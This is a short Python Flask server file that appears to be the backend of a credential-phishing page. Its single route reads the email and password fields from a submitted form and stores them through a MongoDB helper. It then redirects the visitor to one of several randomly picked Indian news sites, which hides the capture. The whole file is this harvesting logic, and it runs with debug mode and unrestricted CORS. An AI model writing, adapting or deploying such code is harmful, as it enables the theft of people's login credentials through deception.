from flask import Flask,render_template,request,url_for,redirect
from flask_cors import CORS
from pymongodb import DB_data
import random

app = Flask(__name__)

CORS(app)

@app.route('/', methods = ["GET","POST"])

def index():

    if request.method == "GET":
        pass
    if request.method == "POST":
        if request.form.get("email") != "" and request.form.get("pwd") != "":
            email = request.form.get("email")
            password = request.form.get("pwd")
            DB_data(email,password)
            url = random.choice(['https://timesofindia.indiatimes.com/','https://edition.cnn.com/india','https://www.indiatoday.in/',
                    'https://indianexpress.com/','https://www.thehindu.com/latest-news/','https://www.news18.com/','https://www.firstpost.com/category/india',
                    'https://www.business-standard.com/','https://economictimes.indiatimes.com/','https://news.google.co.in/','http://ddnews.gov.in/'])
            return redirect(url, code=302)

    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug = True)